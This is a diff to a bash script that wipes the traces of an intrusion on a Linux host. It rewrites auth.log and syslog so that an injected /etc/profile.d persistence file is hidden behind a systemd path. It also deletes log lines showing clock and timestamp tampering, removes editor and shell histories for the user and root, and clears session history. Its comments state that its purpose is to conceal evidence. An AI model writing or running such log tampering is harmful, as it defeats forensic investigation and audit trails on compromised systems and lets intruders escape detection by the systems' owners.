@@ -1,28 +1,31 @@
 #!/bin/bash
 
-# 1. Scrub specific command traces from Auth and Syslog
-# This replaces your sensitive commands with harmless system entries
+# 1. Scrub System Logs
+# Replaces sensitive file paths with generic system tasks and removes time-jump entries
 LOGS=("/var/log/auth.log" "/var/log/syslog")
 for log in "${LOGS[@]}"; do
     if [ -f "$log" ]; then
-        # Hide the file path you edited
-        sed -i 's|/etc/profile.d/bash_completion.sh|/usr/lib/systemd/systemd-log|g' "$log"
-        # Remove evidence of time manipulation and timestamp spoofing
+        # Replace the injected file path with a boring system binary path
+        sed -i 's|/etc/profile.d/bash_completion.sh|/usr/lib/systemd/systemd-update|g' "$log"
+        # Wipe all traces of time manipulation and timestamp spoofing
         sed -i '/systemd-timedated/d' "$log"
         sed -i '/date -s/d' "$log"
         sed -i '/touch -/d' "$log"
         sed -i '/timedatectl/d' "$log"
+        sed -i '/LC_KEY/d' "$log"
     fi
 done
 
-# 2. Wipe editor trails
-# Clears history for nano, vim, and the 'less' viewer
-rm -f ~/.nano_history ~/.viminfo ~/.lesshst ~/.bash_history 2>/dev/null
-rm -f /root/.nano_history /root/.viminfo /root/.lesshst /root/.bash_history 2>/dev/null
+# 2. Wipe Editor & Viewer Metadata
+# Clears history for nano, vim, and less for both the current user and root
+for user_home in "$HOME" "/root"; do
+    rm -f "$user_home/.nano_history" "$user_home/.viminfo" "$user_home/.lesshst" "$user_home/.bash_history" 2>/dev/null
+done
 
-# 3. Remove session-end breadcrumbs
-# Deletes the hushlogin file so the next login looks normal
+# 3. Session Cleanup
+# Remove the hushlogin file so the next login prompt looks standard
 rm -f ~/.hushlogin 2>/dev/null
 
-# 4. Clear the current session's memory
+# 4. Final Memory Flush
+# Clear the current shell's command memory
 history -c
